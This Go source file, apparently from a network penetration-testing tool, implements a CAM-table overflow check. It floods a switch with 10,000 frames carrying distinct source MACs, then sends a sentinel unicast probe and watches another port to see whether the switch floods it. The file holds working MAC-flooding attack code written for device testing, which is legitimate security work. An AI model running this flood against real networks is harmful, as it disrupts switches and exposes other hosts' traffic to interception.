// camflood.go implements the CAM-table overflow check. Impact temporary,
// restore decay with no stated bound, affects device: the frames with
// stamped source MACs fill the switch's CAM table so it floods unicast
// frames to every port, and the entries age out on the switch's own
// timer. The count of 10,000 frames is unconfirmed, since no vendored
// source states a CAM size.

package l2

import (
	"context"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
)

type camFloodFinding struct {
	Action     string `json:"action"`
	FrameCount int    `json:"frame_count"`
	Method     string `json:"method"`
}

// camFloodCount is the number of stamped frames the flood sends.
const camFloodCount = 10_000

// camFloodSrcIP is the constant source IP for CAM-flood frames.
var camFloodSrcIP = net.IPv4(10, 0, 0, 1)

// camFloodDstIP is the broadcast destination IP for CAM-flood frames.
var camFloodDstIP = net.IPv4(255, 255, 255, 255)

// camFloodPayload is the constant UDP payload for CAM-flood frames.
var camFloodPayload = []byte("flood")

// camFloodSentinel is the payload of the unicast probe that follows the
// flood, which the watch leg is read for.
var camFloodSentinel = []byte("netpen-camflood")

// RunCAMFlood sends 10,000 frames with unique source MACs to overflow the
// CAM table, then one unicast frame to the target victim's MAC with a
// sentinel payload, and reads the watch leg for it. The stamped MACs,
// addresses, and payload are probe content. The predicate is the probe on
// the watch leg: a switch that has lost the victim's address to the flood
// forwards the unicast frame to a port that does not own it, which
// confirms; its absence at the window's end resists; no watch leg is
// pending.
func RunCAMFlood(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVictim, check.FieldVictimMAC); err != nil {
		return check.Verdict{}, err
	}
	src := deps.AttackLeg.Addr().MAC
	victim := deps.Target.Victim.MAC

	// Serialize the frame template once. Each flood frame then stamps its
	// sequence into the source MAC of a copy.
	template, err := craftCAMFloodFrame(0)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "camflood: craft template")
	}
	pkt := make([]byte, len(template))
	for i := range camFloodCount {
		seq := i + 1
		copy(pkt, template)
		pkt[10] = byte((seq >> 8) & 0xFF)
		pkt[11] = byte(seq & 0xFF)
		if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
			return check.Verdict{}, errs.Wrapf(err, "camflood: send frame %d", i)
		}
	}

	probe, err := craftCAMFloodProbe(src, victim)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "camflood: craft probe")
	}
	if err := deps.AttackLeg.Send(ctx, probe); err != nil {
		return check.Verdict{}, errs.Wrap(err, "camflood: send probe")
	}

	detail, _ := json.Marshal(camFloodFinding{
		Action:     "cam-table-overflow",
		FrameCount: camFloodCount,
		Method:     "random-source-mac-flood",
	})
	deps.Emitter.Finding("eth", detail)

	v, err := observeWatch(ctx, deps, func(data []byte) bool {
		return isFloodProbe(data, src, victim)
	}, fmt.Sprintf("the switch flooded the unicast probe for %s to the watch leg", victim), "the unicast probe did not reach the watch leg")
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "camflood")
	}
	return v, nil
}

// craftCAMFloodFrame builds a broadcast frame with a unique source MAC
// to fill a CAM table entry.
func craftCAMFloodFrame(seq int) ([]byte, error) {
	floodSrc := net.HardwareAddr{
		0x00, 0x00, 0x00, 0x00,
		byte((seq >> 8) & 0xFF),
		byte(seq & 0xFF),
	}
	eth := &layers.Ethernet{
		DstMAC:       broadcastMAC,
		SrcMAC:       floodSrc,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      64,
		SrcIP:    camFloodSrcIP,
		DstIP:    camFloodDstIP,
		Protocol: layers.IPProtocolUDP,
	}
	udp := &layers.UDP{
		SrcPort: 1234,
		DstPort: 5678,
	}
	_ = udp.SetNetworkLayerForChecksum(ip)
	return craft.Default(eth, ip, udp, gopacket.Payload(camFloodPayload))
}

// craftCAMFloodProbe builds the unicast probe: from the attack leg's MAC
// to the victim's MAC, an IPv4 UDP datagram carrying the sentinel.
func craftCAMFloodProbe(src, victim net.HardwareAddr) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       victim,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      64,
		SrcIP:    camFloodSrcIP,
		DstIP:    net.IPv4(10, 0, 0, 2),
		Protocol: layers.IPProtocolUDP,
	}
	udp := &layers.UDP{
		SrcPort: 1234,
		DstPort: 5678,
	}
	_ = udp.SetNetworkLayerForChecksum(ip)
	return craft.Default(eth, ip, udp, gopacket.Payload(camFloodSentinel))
}
